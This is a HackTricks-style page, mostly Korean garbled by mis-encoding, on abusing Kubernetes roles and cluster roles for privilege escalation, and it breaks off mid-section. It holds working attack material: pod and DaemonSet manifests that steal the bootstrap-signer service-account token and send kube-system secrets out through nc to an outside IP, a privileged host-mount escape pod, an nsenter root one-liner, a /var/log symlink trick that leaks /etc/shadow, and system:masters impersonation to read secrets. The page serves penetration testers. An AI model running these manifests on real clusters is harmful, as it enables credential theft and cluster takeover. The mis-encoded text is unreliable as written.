# Kubernetesì—ì„œ ì—­í• /í´ëŸ¬ìŠ¤í„° ì—­í•  ë‚¨ìš©í•˜ê¸°

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

ì—¬ê¸°ì—ì„œ ì ì¬ì ìœ¼ë¡œ ìœ„í—˜í•œ ì—­í•  ë° í´ëŸ¬ìŠ¤í„° ì—­í•  êµ¬ì„±ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
`kubectl api-resources`ë¥¼ ì‚¬ìš©í•˜ì—¬ ì§€ì›ë˜ëŠ” ëª¨ë“  ë¦¬ì†ŒìŠ¤ë¥¼ ì–»ì„ ìˆ˜ ìˆìŒì„ ê¸°ì–µí•˜ì„¸ìš”.

## **ê¶Œí•œ ìƒìŠ¹**

í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ **ë‹¤ë¥¸ ê¶Œí•œ**ì„ ê°€ì§„ **ë‹¤ë¥¸ ì£¼ì²´ì— ëŒ€í•œ ì ‘ê·¼ì„ ì–»ëŠ” ê¸°ìˆ **ì„ ì˜ë¯¸í•˜ë©°(ì¿ ë²„ë„¤í‹°ìŠ¤ í´ëŸ¬ìŠ¤í„° ë‚´ ë˜ëŠ” ì™¸ë¶€ í´ë¼ìš°ë“œì—), Kubernetesì—ì„œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¤ê¸° ìœ„í•œ 4ê°€ì§€ ì£¼ìš” ê¸°ìˆ **ì´ ìˆìŠµë‹ˆë‹¤:

* ì¿ ë²„ë„¤í‹°ìŠ¤ í´ëŸ¬ìŠ¤í„° ë‚´ ë˜ëŠ” ì™¸ë¶€ í´ë¼ìš°ë“œì—ì„œ ë” ë‚˜ì€ ê¶Œí•œì„ ê°€ì§„ ë‹¤ë¥¸ ì‚¬ìš©ì/ê·¸ë£¹/SAë¥¼ **ê°€ì¥í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**
* ì¿ ë²„ë„¤í‹°ìŠ¤ í´ëŸ¬ìŠ¤í„° ë‚´ ë˜ëŠ” ì™¸ë¶€ í´ë¼ìš°ë“œì—ì„œ ë” ë‚˜ì€ ê¶Œí•œì„ ê°€ì§„ SAë¥¼ **ì°¾ê±°ë‚˜ ì—°ê²°í•  ìˆ˜ ìˆëŠ”** **podë¥¼ ìƒì„±/íŒ¨ì¹˜/ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**
* SA í† í°ì´ ë¹„ë°€ë¡œ ì €ì¥ë˜ë¯€ë¡œ **ë¹„ë°€ì„ ì½ì„ ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**
* ì»¨í…Œì´ë„ˆì—ì„œ ë…¸ë“œë¡œ **íƒˆì¶œí•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**, ì—¬ê¸°ì„œ ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ì»¨í…Œì´ë„ˆì˜ ëª¨ë“  ë¹„ë°€, ë…¸ë“œì˜ ìê²© ì¦ëª… ë° í´ë¼ìš°ë“œ ë‚´ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ë…¸ë“œì˜ ê¶Œí•œì„ í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ìˆëŠ” ê²½ìš°)
* ì–¸ê¸‰í•  ê°€ì¹˜ê°€ ìˆëŠ” ë‹¤ì„¯ ë²ˆì§¸ ê¸°ìˆ ì€ podì—ì„œ **í¬íŠ¸ í¬ì›Œë“œ**ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ìœ¼ë¡œ, í•´ë‹¹ pod ë‚´ì˜ í¥ë¯¸ë¡œìš´ ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ëª¨ë“  ë¦¬ì†ŒìŠ¤ ë˜ëŠ” ë™ì‚¬ì— ì ‘ê·¼í•˜ê¸° (ì™€ì¼ë“œì¹´ë“œ)

**ì™€ì¼ë“œì¹´ë“œ(*)ëŠ” ëª¨ë“  ë™ì‚¬ì— ëŒ€í•´ ëª¨ë“  ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ê¶Œí•œì„ ë¶€ì—¬í•©ë‹ˆë‹¤**. ì´ëŠ” ê´€ë¦¬ìì— ì˜í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. í´ëŸ¬ìŠ¤í„° ì—­í•  ë‚´ì—ì„œ ì´ëŠ” ê³µê²©ìê°€ í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ë‚¨ìš©í•  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### íŠ¹ì • ë™ì‚¬ë¡œ ëª¨ë“  ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•˜ê¸°

RBACì—ì„œ íŠ¹ì • ê¶Œí•œì€ ìƒë‹¹í•œ ìœ„í—˜ì„ ì´ˆë˜í•©ë‹ˆë‹¤:

1. **`create`:** ëª¨ë“  í´ëŸ¬ìŠ¤í„° ë¦¬ì†ŒìŠ¤ë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ë¶€ì—¬í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì˜ ìœ„í—˜ì„ ì´ˆë˜í•©ë‹ˆë‹¤.
2. **`list`:** ëª¨ë“  ë¦¬ì†ŒìŠ¤ë¥¼ ë‚˜ì—´í•  ìˆ˜ ìˆì–´ ë¯¼ê°í•œ ë°ì´í„°ê°€ ìœ ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. **`get`:** ì„œë¹„ìŠ¤ ê³„ì •ì˜ ë¹„ë°€ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ë¶€ì—¬í•˜ì—¬ ë³´ì•ˆ ìœ„í˜‘ì„ ì´ˆë˜í•©ë‹ˆë‹¤.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

í¬ë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì´ ìˆëŠ” ê³µê²©ìëŠ” í¬ë“œì— íŠ¹ê¶Œ ì„œë¹„ìŠ¤ ê³„ì •ì„ ì—°ê²°í•˜ê³  í† í°ì„ í›”ì³ ì„œë¹„ìŠ¤ ê³„ì •ì„ ê°€ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íš¨ê³¼ì ìœ¼ë¡œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

`bootstrap-signer` ì„œë¹„ìŠ¤ ê³„ì •ì˜ í† í°ì„ í›”ì³ ê³µê²©ìì—ê²Œ ì „ì†¡í•˜ëŠ” í¬ë“œì˜ ì˜ˆ:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod ìƒì„± ë° íƒˆì¶œ

ë‹¤ìŒì€ ì»¨í…Œì´ë„ˆê°€ ê°€ì§ˆ ìˆ˜ ìˆëŠ” ëª¨ë“  ê¶Œí•œì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤:

* **íŠ¹ê¶Œ ì•¡ì„¸ìŠ¤** (ë³´í˜¸ ê¸°ëŠ¥ ë¹„í™œì„±í™” ë° ê¸°ëŠ¥ ì„¤ì •)
* **hostIPC ë° hostPid ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë¹„í™œì„±í™”** ê¶Œí•œ ìƒìŠ¹ì— ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤
* **hostNetwork** ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë¹„í™œì„±í™”, ë…¸ë“œì˜ í´ë¼ìš°ë“œ ê¶Œí•œì„ í›”ì¹˜ê³  ë„¤íŠ¸ì›Œí¬ì— ë” ë‚˜ì€ ì ‘ê·¼ì„ ì œê³µí•©ë‹ˆë‹¤
* **í˜¸ìŠ¤íŠ¸ë¥¼ ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì— ë§ˆìš´íŠ¸**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

ë‹¤ìŒê³¼ ê°™ì´ í¬ë“œë¥¼ ìƒì„±í•©ë‹ˆë‹¤:
```bash
kubectl --token $token create -f mount_root.yaml
```
One-liner from [this tweet](https://twitter.com/mauilion/status/1129468485480751104)ì™€ ëª‡ ê°€ì§€ ì¶”ê°€ ì‚¬í•­:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
ì´ì œ ë…¸ë“œë¡œ íƒˆì¶œí•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ë‹¤ìŒ í˜ì´ì§€ì—ì„œ **íƒˆì¶œ í›„ í™œìš© ê¸°ìˆ **ì„ í™•ì¸í•˜ì„¸ìš”:

#### Stealth

ì•„ë§ˆë„ **ë” ì€ë°€í•˜ê²Œ** í–‰ë™í•˜ê³  ì‹¶ì„ ê²ƒì…ë‹ˆë‹¤. ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” ì´ì „ í…œí”Œë¦¿ì—ì„œ ì–¸ê¸‰ëœ ì¼ë¶€ ê¶Œí•œë§Œ í™œì„±í™”í•˜ì—¬ **pod**ë¥¼ ìƒì„±í•  ê²½ìš° ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **Privileged + hostPID**
* **Privileged only**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_ì´ì „ì˜ íŠ¹ê¶Œ ìˆëŠ” pod êµ¬ì„± ìƒì„±/ì•…ìš© ë°©ë²•ì˜ ì˜ˆì‹œëŠ”_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤._

### Pod Create - Move to cloud

**pod**(ë° ì„ íƒì ìœ¼ë¡œ **ì„œë¹„ìŠ¤ ê³„ì •**)ì„ **ìƒì„±**í•  ìˆ˜ ìˆë‹¤ë©´, **pod ë˜ëŠ” ì„œë¹„ìŠ¤ ê³„ì •ì— í´ë¼ìš°ë“œ ì—­í• ì„ í• ë‹¹**í•˜ì—¬ **í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ ê¶Œí•œì„ ì–»ì„ ìˆ˜** ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ, **í˜¸ìŠ¤íŠ¸ ë„¤íŠ¸ì›Œí¬ ë„¤ì„ìŠ¤í˜ì´ìŠ¤**ë¡œ **pod**ë¥¼ ìƒì„±í•  ìˆ˜ ìˆë‹¤ë©´, **ë…¸ë“œ** ì¸ìŠ¤í„´ìŠ¤ì˜ **IAM** ì—­í• ì„ **íƒˆì·¨**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

ì´ëŸ¬í•œ ê¶Œí•œì„ ì•…ìš©í•˜ì—¬ **ìƒˆë¡œìš´ pod**ë¥¼ **ìƒì„±**í•˜ê³  ì´ì „ ì˜ˆì™€ ê°™ì´ ê¶Œí•œì„ í™•ë¦½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ yamlì€ **daemonsetì„ ìƒì„±í•˜ê³  pod ë‚´ë¶€ì˜ SA í† í°ì„ ìœ ì¶œ**í•©ë‹ˆë‹¤:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`**ëŠ” **í¬ë“œ ë‚´ë¶€ì—ì„œ ì…¸ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” kubernetesì˜ ë¦¬ì†ŒìŠ¤**ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ **ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê±°ë‚˜ ì…¸ì— ë“¤ì–´ê°ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ë”°ë¼ì„œ **í¬ë“œì— ë“¤ì–´ê°€ SAì˜ í† í°ì„ í›”ì¹˜ê±°ë‚˜, íŠ¹ê¶Œ í¬ë“œì— ë“¤ì–´ê°€ ë…¸ë“œë¡œ íƒˆì¶œí•˜ì—¬ ë…¸ë“œì˜ ëª¨ë“  í¬ë“œ í† í°ì„ í›”ì¹˜ê³  (ì•…ìš©) ë…¸ë“œë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

ì´ ê¶Œí•œì€ **í•˜ë‚˜ì˜ ë¡œì»¬ í¬íŠ¸ë¥¼ ì§€ì •ëœ í¬ë“œì˜ í•˜ë‚˜ì˜ í¬íŠ¸ë¡œ í¬ì›Œë”©í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤**. ì´ëŠ” í¬ë“œ ë‚´ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‰½ê²Œ ë””ë²„ê¹…í•  ìˆ˜ ìˆë„ë¡ í•˜ê¸° ìœ„í•œ ê²ƒì´ì§€ë§Œ, ê³µê²©ìëŠ” ì´ë¥¼ ì•…ìš©í•˜ì—¬ í¬ë“œ ë‚´ì˜ í¥ë¯¸ë¡œìš´ (ì˜ˆ: DB) ë˜ëŠ” ì·¨ì•½í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ (ì›¹?)ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

As [**indicated in this research**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), if you can access or create a pod with the **hosts `/var/log/` directory mounted** on it, you can **escape from the container**.\
This is basically because the when the **Kube-API tries to get the logs** of a container (using `kubectl logs <pod>`), it **requests the `0.log`** file of the pod using the `/logs/` endpoint of the **Kubelet** service.\
The Kubelet service exposes the `/logs/` endpoint which is just basically **exposing the `/var/log` filesystem of the container**.

ë”°ë¼ì„œ **/var/log/** í´ë”ì— ì“¸ ìˆ˜ ìˆëŠ” ì ‘ê·¼ ê¶Œí•œì´ ìˆëŠ” ê³µê²©ìëŠ” ì´ í–‰ë™ì„ 2ê°€ì§€ ë°©ë²•ìœ¼ë¡œ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ìì‹ ì˜ ì»¨í…Œì´ë„ˆì˜ `0.log` íŒŒì¼ì„ ìˆ˜ì •í•˜ì—¬ (ë³´í†µ `/var/logs/pods/namespace_pod_uid/container/0.log`ì— ìœ„ì¹˜) ì˜ˆë¥¼ ë“¤ì–´ **`/etc/shadow`**ë¥¼ ê°€ë¦¬í‚¤ëŠ” **ì‹¬ë³¼ë¦­ ë§í¬**ë¡œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë©´ ë‹¤ìŒê³¼ ê°™ì´ í˜¸ìŠ¤íŠ¸ì˜ shadow íŒŒì¼ì„ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* ê³µê²©ìê°€ **`nodes/log`**ë¥¼ ì½ì„ ìˆ˜ ìˆëŠ” **ê¶Œí•œ**ì„ ê°€ì§„ ì£¼ì²´ë¥¼ ì œì–´í•˜ëŠ” ê²½ìš°, ê·¸ëŠ” ë‹¨ìˆœíˆ `/host-mounted/var/log/sym`ì— `/`ì— ëŒ€í•œ **symlink**ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìœ¼ë©°, **`https://<gateway>:10250/logs/sym/`ì— ì ‘ê·¼í•  ë•Œ í˜¸ìŠ¤íŠ¸ì˜ ë£¨íŠ¸** íŒŒì¼ ì‹œìŠ¤í…œì„ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (symlinkë¥¼ ë³€ê²½í•˜ë©´ íŒŒì¼ì— ëŒ€í•œ ì ‘ê·¼ì´ ê°€ëŠ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**ì‹¤í—˜ì‹¤ ë° ìë™í™”ëœ ìµìŠ¤í”Œë¡œì‡ì€** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### readOnly ë³´í˜¸ ìš°íšŒ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

ìš´ì´ ì¢‹ë‹¤ë©´, ê³ ë„ë¡œ íŠ¹ê¶Œì´ ë¶€ì—¬ëœ ëŠ¥ë ¥ `CAP_SYS_ADMIN`ì´ ì‚¬ìš© ê°€ëŠ¥í•  ê²½ìš°, í´ë”ë¥¼ rwë¡œ ë‹¤ì‹œ ë§ˆìš´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**ì´ ì—°êµ¬**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ì—ì„œ ì–¸ê¸‰ëœ ë°”ì™€ ê°™ì´, ë³´í˜¸ë¥¼ ìš°íšŒí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
ì´ì „ê³¼ ê°™ì€ íƒˆì¶œì„ ë°©ì§€í•˜ê¸° ìœ„í•´, hostPath ë§ˆìš´íŠ¸ë¥¼ ì‚¬ìš©í•˜ëŠ” ëŒ€ì‹  PersistentVolumeê³¼ PersistentVolumeClaimì„ ì‚¬ìš©í•˜ì—¬ ì»¨í…Œì´ë„ˆì— ì“°ê¸° ê°€ëŠ¥í•œ ì ‘ê·¼ ê¶Œí•œìœ¼ë¡œ í˜¸ìŠ¤íŠ¸ í´ë”ë¥¼ ë§ˆìš´íŠ¸í•˜ëŠ” ê²ƒì´ ëª©ì ì´ì—ˆìŠµë‹ˆë‹¤:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **íŠ¹ê¶Œ ê³„ì • ê°€ì¥í•˜ê¸°**

[**ì‚¬ìš©ì ê°€ì¥í•˜ê¸°**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) ê¶Œí•œì„ ì‚¬ìš©í•˜ë©´ ê³µê²©ìê°€ íŠ¹ê¶Œ ê³„ì •ì„ ê°€ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`kubectl` ëª…ë ¹ì—ì„œ `--as=<username>` ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ìë¥¼ ê°€ì¥í•˜ê±°ë‚˜, `--as-group=<group>`ì„ ì‚¬ìš©í•˜ì—¬ ê·¸ë£¹ì„ ê°€ì¥í•˜ì‹­ì‹œì˜¤:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
ë˜ëŠ” REST APIë¥¼ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Listing Secrets

**ë¹„ë°€ì„ ë‚˜ì—´í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì€ ê³µê²©ìê°€ ì‹¤ì œë¡œ ë¹„ë°€ì„ ì½ì„ ìˆ˜ ìˆê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤** REST API ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼í•˜ì—¬:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### ë¹„ë°€ ì½ê¸° â€“ í† í° ID ë¬´ì‘ìœ„ ëŒ€ì…

ì½ê¸° ê¶Œí•œì´ ìˆëŠ” í† í°ì„ ì†Œìœ í•œ ê³µê²©ìëŠ” ì´ë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ë¹„ë°€ì˜ ì •í™•í•œ ì´ë¦„ì´ í•„ìš”í•˜ì§€ë§Œ, ë” ë„“ì€ _**ë¹„ë°€ ë‚˜ì—´**_ ê¶Œí•œê³¼ëŠ” ë‹¬ë¦¬ ì—¬ì „íˆ ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì‹œìŠ¤í…œì˜ ê¸°ë³¸ ì„œë¹„ìŠ¤ ê³„ì •ì€ ì—´ê±°í•  ìˆ˜ ìˆìœ¼ë©°, ê° ê³„ì •ì€ ë¹„ë°€ê³¼ ì—°ê²°ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ë¹„ë°€ì€ ì •ì  ì ‘ë‘ì‚¬ ë’¤ì— íŠ¹ì • ë¬¸ìë¥¼ ì œì™¸í•œ ë¬´ì‘ìœ„ 5ì ì•ŒíŒŒë²³ ìˆ«ì í† í°ì´ ì˜¤ëŠ” ì´ë¦„ êµ¬ì¡°ë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤([ì†ŒìŠ¤ ì½”ë“œ](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)).

í† í°ì€ ì „ì²´ ì•ŒíŒŒë²³ ìˆ«ì ë²”ìœ„ê°€ ì•„ë‹Œ ì œí•œëœ 27ì ì§‘í•©(`bcdfghjklmnpqrstvwxz2456789`)ì—ì„œ ìƒì„±ë©ë‹ˆë‹¤. ì´ ì œí•œìœ¼ë¡œ ì¸í•´ ê°€ëŠ¥í•œ ì¡°í•©ì˜ ì´ ìˆ˜ëŠ” 14,348,907(27^5)ë¡œ ì¤„ì–´ë“­ë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” ëª‡ ì‹œê°„ ë‚´ì— í† í°ì„ ì¶”ë¡ í•˜ê¸° ìœ„í•´ ë¬´ì‘ìœ„ ëŒ€ì… ê³µê²©ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ë¯¼ê°í•œ ì„œë¹„ìŠ¤ ê³„ì •ì— ì ‘ê·¼í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì¸ì¦ì„œ ì„œëª… ìš”ì²­

`certificatesigningrequests` ë¦¬ì†ŒìŠ¤ì—ì„œ **`create`** ë™ì‚¬ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´ (ë˜ëŠ” ìµœì†Œí•œ `certificatesigningrequests/nodeClient`ì—ì„œ). **ìƒˆ ë…¸ë“œì˜** ìƒˆë¡œìš´ CeSRì„ **ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

